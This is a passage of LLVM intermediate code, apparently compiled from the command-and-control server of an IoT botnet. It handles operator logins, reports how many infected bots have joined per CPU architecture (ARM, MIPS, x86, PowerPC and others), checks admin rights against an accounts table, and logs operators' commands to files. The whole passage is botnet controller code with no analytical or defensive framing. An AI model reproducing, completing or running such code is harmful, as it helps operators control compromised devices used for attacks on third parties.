  %194 = call i32 @fdgets(i8* %192, i32 2048, i32 %193)
  %195 = icmp sgt i32 %194, 0
  br i1 %195, label %196, label %605

196:                                              ; preds = %191
  %197 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %198 = call i8* @strstr(i8* %197, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i64 0, i64 0)) #8
  %199 = icmp ne i8* %198, null
  br i1 %199, label %200, label %212

200:                                              ; preds = %196
  %201 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %202 = call i32 @clientsJoining()
  %203 = call i32 (i8*, i8*, ...) @sprintf(i8* %201, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.39, i64 0, i64 0), i32 %202) #10
  %204 = load i32, i32* %5, align 4
  %205 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %206 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %207 = call i64 @strlen(i8* %206) #8
  %208 = call i64 @send(i32 %204, i8* %205, i64 %207, i32 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %211

210:                                              ; preds = %200
  br label %211

211:                                              ; preds = %210, %200
  br label %212

212:                                              ; preds = %211, %196
  %213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %214 = call i8* @strstr(i8* %213, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.40, i64 0, i64 0)) #8
  %215 = icmp ne i8* %214, null
  br i1 %215, label %216, label %316

216:                                              ; preds = %212
  %217 = getelementptr inbounds [128 x i8], [128 x i8]* %24, i64 0, i64 0
  %218 = call i32 @armJoining()
  %219 = call i32 (i8*, i8*, ...) @sprintf(i8* %217, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.41, i64 0, i64 0), i32 %218) #10
  %220 = getelementptr inbounds [128 x i8], [128 x i8]* %25, i64 0, i64 0
  %221 = call i32 @mipsJoining()
  %222 = call i32 (i8*, i8*, ...) @sprintf(i8* %220, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.42, i64 0, i64 0), i32 %221) #10
  %223 = getelementptr inbounds [128 x i8], [128 x i8]* %26, i64 0, i64 0
  %224 = call i32 @mpslJoining()
  %225 = call i32 (i8*, i8*, ...) @sprintf(i8* %223, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.43, i64 0, i64 0), i32 %224) #10
  %226 = getelementptr inbounds [128 x i8], [128 x i8]* %27, i64 0, i64 0
  %227 = call i32 @x86Joining()
  %228 = call i32 (i8*, i8*, ...) @sprintf(i8* %226, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.44, i64 0, i64 0), i32 %227) #10
  %229 = getelementptr inbounds [128 x i8], [128 x i8]* %28, i64 0, i64 0
  %230 = call i32 @spcJoining()
  %231 = call i32 (i8*, i8*, ...) @sprintf(i8* %229, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.45, i64 0, i64 0), i32 %230) #10
  %232 = getelementptr inbounds [128 x i8], [128 x i8]* %29, i64 0, i64 0
  %233 = call i32 @ppcJoining()
  %234 = call i32 (i8*, i8*, ...) @sprintf(i8* %232, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.46, i64 0, i64 0), i32 %233) #10
  %235 = getelementptr inbounds [128 x i8], [128 x i8]* %30, i64 0, i64 0
  %236 = call i32 @arcJoining()
  %237 = call i32 (i8*, i8*, ...) @sprintf(i8* %235, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.47, i64 0, i64 0), i32 %236) #10
  %238 = getelementptr inbounds [128 x i8], [128 x i8]* %31, i64 0, i64 0
  %239 = call i32 @unkJoining()
  %240 = call i32 (i8*, i8*, ...) @sprintf(i8* %238, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.48, i64 0, i64 0), i32 %239) #10
  %241 = getelementptr inbounds [128 x i8], [128 x i8]* %32, i64 0, i64 0
  %242 = call i32 @clientsJoining()
  %243 = call i32 (i8*, i8*, ...) @sprintf(i8* %241, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.49, i64 0, i64 0), i32 %242) #10
  %244 = load i32, i32* %5, align 4
  %245 = getelementptr inbounds [128 x i8], [128 x i8]* %24, i64 0, i64 0
  %246 = getelementptr inbounds [128 x i8], [128 x i8]* %24, i64 0, i64 0
  %247 = call i64 @strlen(i8* %246) #8
  %248 = call i64 @send(i32 %244, i8* %245, i64 %247, i32 16384)
  %249 = icmp eq i64 %248, -1
  br i1 %249, label %250, label %251

250:                                              ; preds = %216
  br label %606

251:                                              ; preds = %216
  %252 = load i32, i32* %5, align 4
  %253 = getelementptr inbounds [128 x i8], [128 x i8]* %25, i64 0, i64 0
  %254 = getelementptr inbounds [128 x i8], [128 x i8]* %25, i64 0, i64 0
  %255 = call i64 @strlen(i8* %254) #8
  %256 = call i64 @send(i32 %252, i8* %253, i64 %255, i32 16384)
  %257 = icmp eq i64 %256, -1
  br i1 %257, label %258, label %259

258:                                              ; preds = %251
  br label %606

259:                                              ; preds = %251
  %260 = load i32, i32* %5, align 4
  %261 = getelementptr inbounds [128 x i8], [128 x i8]* %26, i64 0, i64 0
  %262 = getelementptr inbounds [128 x i8], [128 x i8]* %26, i64 0, i64 0
  %263 = call i64 @strlen(i8* %262) #8
  %264 = call i64 @send(i32 %260, i8* %261, i64 %263, i32 16384)
  %265 = icmp eq i64 %264, -1
  br i1 %265, label %266, label %267

266:                                              ; preds = %259
  br label %606

267:                                              ; preds = %259
  %268 = load i32, i32* %5, align 4
  %269 = getelementptr inbounds [128 x i8], [128 x i8]* %27, i64 0, i64 0
  %270 = getelementptr inbounds [128 x i8], [128 x i8]* %27, i64 0, i64 0
  %271 = call i64 @strlen(i8* %270) #8
  %272 = call i64 @send(i32 %268, i8* %269, i64 %271, i32 16384)
  %273 = icmp eq i64 %272, -1
  br i1 %273, label %274, label %275

274:                                              ; preds = %267
  br label %606

275:                                              ; preds = %267
  %276 = load i32, i32* %5, align 4
  %277 = getelementptr inbounds [128 x i8], [128 x i8]* %28, i64 0, i64 0
  %278 = getelementptr inbounds [128 x i8], [128 x i8]* %28, i64 0, i64 0
  %279 = call i64 @strlen(i8* %278) #8
  %280 = call i64 @send(i32 %276, i8* %277, i64 %279, i32 16384)
  %281 = icmp eq i64 %280, -1
  br i1 %281, label %282, label %283

282:                                              ; preds = %275
  br label %606

283:                                              ; preds = %275
  %284 = load i32, i32* %5, align 4
  %285 = getelementptr inbounds [128 x i8], [128 x i8]* %29, i64 0, i64 0
  %286 = getelementptr inbounds [128 x i8], [128 x i8]* %29, i64 0, i64 0
  %287 = call i64 @strlen(i8* %286) #8
  %288 = call i64 @send(i32 %284, i8* %285, i64 %287, i32 16384)
  %289 = icmp eq i64 %288, -1
  br i1 %289, label %290, label %291

290:                                              ; preds = %283
  br label %606

291:                                              ; preds = %283
  %292 = load i32, i32* %5, align 4
  %293 = getelementptr inbounds [128 x i8], [128 x i8]* %30, i64 0, i64 0
  %294 = getelementptr inbounds [128 x i8], [128 x i8]* %30, i64 0, i64 0
  %295 = call i64 @strlen(i8* %294) #8
  %296 = call i64 @send(i32 %292, i8* %293, i64 %295, i32 16384)
  %297 = icmp eq i64 %296, -1
  br i1 %297, label %298, label %299

298:                                              ; preds = %291
  br label %606

299:                                              ; preds = %291
  %300 = load i32, i32* %5, align 4
  %301 = getelementptr inbounds [128 x i8], [128 x i8]* %31, i64 0, i64 0
  %302 = getelementptr inbounds [128 x i8], [128 x i8]* %31, i64 0, i64 0
  %303 = call i64 @strlen(i8* %302) #8
  %304 = call i64 @send(i32 %300, i8* %301, i64 %303, i32 16384)
  %305 = icmp eq i64 %304, -1
  br i1 %305, label %306, label %307

306:                                              ; preds = %299
  br label %606

307:                                              ; preds = %299
  %308 = load i32, i32* %5, align 4
  %309 = getelementptr inbounds [128 x i8], [128 x i8]* %32, i64 0, i64 0
  %310 = getelementptr inbounds [128 x i8], [128 x i8]* %32, i64 0, i64 0
  %311 = call i64 @strlen(i8* %310) #8
  %312 = call i64 @send(i32 %308, i8* %309, i64 %311, i32 16384)
  %313 = icmp eq i64 %312, -1
  br i1 %313, label %314, label %315

314:                                              ; preds = %307
  br label %606

315:                                              ; preds = %307
  br label %316

316:                                              ; preds = %315, %212
  %317 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %318 = call i8* @strstr(i8* %317, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i64 0, i64 0)) #8
  %319 = icmp ne i8* %318, null
  br i1 %319, label %320, label %351

320:                                              ; preds = %316
  %321 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %322 = call i32 (i8*, i8*, ...) @sprintf(i8* %321, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.51, i64 0, i64 0)) #10
  %323 = load i32, i32* %5, align 4
  %324 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %325 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %326 = call i64 @strlen(i8* %325) #8
  %327 = call i64 @send(i32 %323, i8* %324, i64 %326, i32 16384)
  %328 = icmp eq i64 %327, -1
  br i1 %328, label %329, label %330

329:                                              ; preds = %320
  br label %330

330:                                              ; preds = %329, %320
  %331 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %332 = call i32 (i8*, i8*, ...) @sprintf(i8* %331, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.52, i64 0, i64 0)) #10
  %333 = load i32, i32* %5, align 4
  %334 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %336 = call i64 @strlen(i8* %335) #8
  %337 = call i64 @send(i32 %333, i8* %334, i64 %336, i32 16384)
  %338 = icmp eq i64 %337, -1
  br i1 %338, label %339, label %340

339:                                              ; preds = %330
  br label %340

340:                                              ; preds = %339, %330
  %341 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %342 = call i32 (i8*, i8*, ...) @sprintf(i8* %341, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.53, i64 0, i64 0)) #10
  %343 = load i32, i32* %5, align 4
  %344 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %346 = call i64 @strlen(i8* %345) #8
  %347 = call i64 @send(i32 %343, i8* %344, i64 %346, i32 16384)
  %348 = icmp eq i64 %347, -1
  br i1 %348, label %349, label %350

349:                                              ; preds = %340
  br label %350

350:                                              ; preds = %349, %340
  br label %351

351:                                              ; preds = %350, %316
  %352 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %353 = call i8* @strstr(i8* %352, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.54, i64 0, i64 0)) #8
  %354 = icmp ne i8* %353, null
  br i1 %354, label %355, label %386

355:                                              ; preds = %351
  %356 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %357 = call i32 (i8*, i8*, ...) @sprintf(i8* %356, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.55, i64 0, i64 0)) #10
  %358 = load i32, i32* %5, align 4
  %359 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %360 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %361 = call i64 @strlen(i8* %360) #8
  %362 = call i64 @send(i32 %358, i8* %359, i64 %361, i32 16384)
  %363 = icmp eq i64 %362, -1
  br i1 %363, label %364, label %365

364:                                              ; preds = %355
  br label %365

365:                                              ; preds = %364, %355
  %366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %367 = call i32 (i8*, i8*, ...) @sprintf(i8* %366, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.56, i64 0, i64 0)) #10
  %368 = load i32, i32* %5, align 4
  %369 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %370 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %371 = call i64 @strlen(i8* %370) #8
  %372 = call i64 @send(i32 %368, i8* %369, i64 %371, i32 16384)
  %373 = icmp eq i64 %372, -1
  br i1 %373, label %374, label %375

374:                                              ; preds = %365
  br label %375

375:                                              ; preds = %374, %365
  %376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %377 = call i32 (i8*, i8*, ...) @sprintf(i8* %376, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.57, i64 0, i64 0)) #10
  %378 = load i32, i32* %5, align 4
  %379 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %380 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %381 = call i64 @strlen(i8* %380) #8
  %382 = call i64 @send(i32 %378, i8* %379, i64 %381, i32 16384)
  %383 = icmp eq i64 %382, -1
  br i1 %383, label %384, label %385

384:                                              ; preds = %375
  br label %385

385:                                              ; preds = %384, %375
  br label %386

386:                                              ; preds = %385, %351
  %387 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %388 = call i8* @strstr(i8* %387, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i64 0, i64 0)) #8
  %389 = icmp ne i8* %388, null
  br i1 %389, label %390, label %422

390:                                              ; preds = %386
  %391 = load i8*, i8** %13, align 8
  %392 = load i32, i32* %6, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %393
  %395 = getelementptr inbounds %struct.account, %struct.account* %394, i32 0, i32 2
  %396 = getelementptr inbounds [200 x i8], [200 x i8]* %395, i64 0, i64 0
  %397 = call i32 @strcmp(i8* %391, i8* %396) #8
  %398 = icmp eq i32 %397, 0
  br i1 %398, label %399, label %410

399:                                              ; preds = %390
  %400 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %401 = call i32 (i8*, i8*, ...) @sprintf(i8* %400, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.59, i64 0, i64 0)) #10
  %402 = load i32, i32* %5, align 4
  %403 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %404 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %405 = call i64 @strlen(i8* %404) #8
  %406 = call i64 @send(i32 %402, i8* %403, i64 %405, i32 16384)
  %407 = icmp eq i64 %406, -1
  br i1 %407, label %408, label %409

408:                                              ; preds = %399
  br label %409

409:                                              ; preds = %408, %399
  br label %421

410:                                              ; preds = %390
  %411 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %412 = call i32 (i8*, i8*, ...) @sprintf(i8* %411, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.60, i64 0, i64 0)) #10
  %413 = load i32, i32* %5, align 4
  %414 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %415 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %416 = call i64 @strlen(i8* %415) #8
  %417 = call i64 @send(i32 %413, i8* %414, i64 %416, i32 16384)
  %418 = icmp eq i64 %417, -1
  br i1 %418, label %419, label %420

419:                                              ; preds = %410
  br label %420

420:                                              ; preds = %419, %410
  br label %421

421:                                              ; preds = %420, %409
  br label %422

422:                                              ; preds = %421, %386
  %423 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %424 = call i8* @strstr(i8* %423, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i64 0, i64 0)) #8
  %425 = icmp ne i8* %424, null
  br i1 %425, label %426, label %467

426:                                              ; preds = %422
  %427 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %428 = call i32 (i8*, i8*, ...) @sprintf(i8* %427, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.62, i64 0, i64 0)) #10
  %429 = load i32, i32* %5, align 4
  %430 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %431 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %432 = call i64 @strlen(i8* %431) #8
  %433 = call i64 @send(i32 %429, i8* %430, i64 %432, i32 16384)
  %434 = icmp eq i64 %433, -1
  br i1 %434, label %435, label %436

435:                                              ; preds = %426
  br label %436

436:                                              ; preds = %435, %426
  %437 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %438 = call i32 (i8*, i8*, ...) @sprintf(i8* %437, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.63, i64 0, i64 0)) #10
  %439 = load i32, i32* %5, align 4
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %441 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %442 = call i64 @strlen(i8* %441) #8
  %443 = call i64 @send(i32 %439, i8* %440, i64 %442, i32 16384)
  %444 = icmp eq i64 %443, -1
  br i1 %444, label %445, label %446

445:                                              ; preds = %436
  br label %446

446:                                              ; preds = %445, %436
  %447 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %448 = call i32 (i8*, i8*, ...) @sprintf(i8* %447, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.64, i64 0, i64 0)) #10
  %449 = load i32, i32* %5, align 4
  %450 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %451 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %452 = call i64 @strlen(i8* %451) #8
  %453 = call i64 @send(i32 %449, i8* %450, i64 %452, i32 16384)
  %454 = icmp eq i64 %453, -1
  br i1 %454, label %455, label %456

455:                                              ; preds = %446
  br label %456

456:                                              ; preds = %455, %446
  %457 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %458 = call i32 (i8*, i8*, ...) @sprintf(i8* %457, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.65, i64 0, i64 0)) #10
  %459 = load i32, i32* %5, align 4
  %460 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %461 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %462 = call i64 @strlen(i8* %461) #8
  %463 = call i64 @send(i32 %459, i8* %460, i64 %462, i32 16384)
  %464 = icmp eq i64 %463, -1
  br i1 %464, label %465, label %466

465:                                              ; preds = %456
  br label %466

466:                                              ; preds = %465, %456
  br label %467

467:                                              ; preds = %466, %422
  %468 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %469 = call i32 @strncmp(i8* %468, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i64 0, i64 0), i64 3) #8
  %470 = icmp eq i32 %469, 0
  br i1 %470, label %483, label %471

471:                                              ; preds = %467
  %472 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %473 = call i32 @strncmp(i8* %472, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i64 0, i64 0), i64 3) #8
  %474 = icmp eq i32 %473, 0
  br i1 %474, label %483, label %475

475:                                              ; preds = %471
  %476 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %477 = call i32 @strncmp(i8* %476, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i64 0, i64 0), i64 3) #8
  %478 = icmp eq i32 %477, 0
  br i1 %478, label %483, label %479

479:                                              ; preds = %475
  %480 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %481 = call i32 @strncmp(i8* %480, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i64 0, i64 0), i64 3) #8
  %482 = icmp eq i32 %481, 0
  br i1 %482, label %483, label %515

483:                                              ; preds = %479, %475, %471, %467
  %484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %485 = call i32 (i8*, i8*, ...) @sprintf(i8* %484, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i64 0, i64 0)) #10
  %486 = load i32, i32* %5, align 4
  %487 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %488 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %489 = call i64 @strlen(i8* %488) #8
  %490 = call i64 @send(i32 %486, i8* %487, i64 %489, i32 16384)
  %491 = icmp eq i64 %490, -1
  br i1 %491, label %492, label %493

492:                                              ; preds = %483
  br label %493

493:                                              ; preds = %492, %483
  %494 = load i32, i32* %5, align 4
  %495 = call i64 @send(i32 %494, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.71, i64 0, i64 0), i64 17, i32 16384)
  %496 = icmp eq i64 %495, -1
  br i1 %496, label %497, label %498

497:                                              ; preds = %493
  br label %606

498:                                              ; preds = %493
  %499 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.72, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %499, %struct._IO_FILE** %33, align 8
  %500 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %501 = load i32, i32* %6, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %502
  %504 = getelementptr inbounds %struct.account, %struct.account* %503, i32 0, i32 0
  %505 = getelementptr inbounds [200 x i8], [200 x i8]* %504, i64 0, i64 0
  %506 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %500, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i64 0, i64 0), i8* %505)
  %507 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %508 = call i32 @fclose(%struct._IO_FILE* %507)
  %509 = load i32, i32* %6, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %510
  %512 = getelementptr inbounds %struct.account, %struct.account* %511, i32 0, i32 0
  %513 = getelementptr inbounds [200 x i8], [200 x i8]* %512, i64 0, i64 0
  %514 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.74, i64 0, i64 0), i8* %513)
  br label %515

515:                                              ; preds = %498, %479
  %516 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %517 = call i8* @strstr(i8* %516, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.75, i64 0, i64 0)) #8
  %518 = icmp ne i8* %517, null
  br i1 %518, label %519, label %546

519:                                              ; preds = %515
  %520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %521 = call i32 (i8*, i8*, ...) @sprintf(i8* %520, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.76, i64 0, i64 0)) #10
  %522 = load i32, i32* %5, align 4
  %523 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %524 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %525 = call i64 @strlen(i8* %524) #8
  %526 = call i64 @send(i32 %522, i8* %523, i64 %525, i32 16384)
  %527 = icmp eq i64 %526, -1
  br i1 %527, label %528, label %529

528:                                              ; preds = %519
  br label %529

529:                                              ; preds = %528, %519
  %530 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.72, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %530, %struct._IO_FILE** %34, align 8
  %531 = load %struct._IO_FILE*, %struct._IO_FILE** %34, align 8
  %532 = load i32, i32* %6, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %533
  %535 = getelementptr inbounds %struct.account, %struct.account* %534, i32 0, i32 0
  %536 = getelementptr inbounds [200 x i8], [200 x i8]* %535, i64 0, i64 0
  %537 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %531, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.77, i64 0, i64 0), i8* %536)
  %538 = load %struct._IO_FILE*, %struct._IO_FILE** %34, align 8
  %539 = call i32 @fclose(%struct._IO_FILE* %538)
  %540 = load i32, i32* %6, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %541
  %543 = getelementptr inbounds %struct.account, %struct.account* %542, i32 0, i32 0
  %544 = getelementptr inbounds [200 x i8], [200 x i8]* %543, i64 0, i64 0
  %545 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.77, i64 0, i64 0), i8* %544)
  br label %546

546:                                              ; preds = %529, %515
  %547 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %548 = call i8* @strstr(i8* %547, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i64 0, i64 0)) #8
  %549 = icmp ne i8* %548, null
  br i1 %549, label %550, label %556

550:                                              ; preds = %546
  %551 = load i32, i32* %5, align 4
  %552 = call i64 @send(i32 %551, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i64 0, i64 0), i64 16, i32 16384)
  %553 = icmp eq i64 %552, -1
  br i1 %553, label %554, label %555

554:                                              ; preds = %550
  br label %606

555:                                              ; preds = %550
  br label %556

556:                                              ; preds = %555, %546
  %557 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %558 = call i8* @strstr(i8* %557, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i64 0, i64 0)) #8
  %559 = icmp ne i8* %558, null
  br i1 %559, label %560, label %561

560:                                              ; preds = %556
  br label %606

561:                                              ; preds = %556
  %562 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %562)
  %563 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %564 = load i32, i32* %6, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %565
  %567 = getelementptr inbounds %struct.account, %struct.account* %566, i32 0, i32 0
  %568 = getelementptr inbounds [200 x i8], [200 x i8]* %567, i64 0, i64 0
  %569 = call i32 (i8*, i8*, ...) @sprintf(i8* %563, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.80, i64 0, i64 0), i8* %568) #10
  %570 = load i32, i32* %5, align 4
  %571 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %572 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %573 = call i64 @strlen(i8* %572) #8
  %574 = call i64 @send(i32 %570, i8* %571, i64 %573, i32 16384)
  %575 = icmp eq i64 %574, -1
  br i1 %575, label %576, label %577

576:                                              ; preds = %561
  br label %606

577:                                              ; preds = %561
  %578 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %579 = call i64 @strlen(i8* %578) #8
  %580 = icmp eq i64 %579, 0
  br i1 %580, label %581, label %582

581:                                              ; preds = %577
  br label %191, !llvm.loop !27

582:                                              ; preds = %577
  %583 = load i32, i32* %6, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %584
  %586 = getelementptr inbounds %struct.account, %struct.account* %585, i32 0, i32 0
  %587 = getelementptr inbounds [200 x i8], [200 x i8]* %586, i64 0, i64 0
  %588 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %589 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.81, i64 0, i64 0), i8* %587, i8* %588)
  %590 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %590, %struct._IO_FILE** %35, align 8
  %591 = load %struct._IO_FILE*, %struct._IO_FILE** %35, align 8
  %592 = load i32, i32* %6, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %593
  %595 = getelementptr inbounds %struct.account, %struct.account* %594, i32 0, i32 0
  %596 = getelementptr inbounds [200 x i8], [200 x i8]* %595, i64 0, i64 0
  %597 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %598 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %591, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.81, i64 0, i64 0), i8* %596, i8* %597)
  %599 = load %struct._IO_FILE*, %struct._IO_FILE** %35, align 8
  %600 = call i32 @fclose(%struct._IO_FILE* %599)
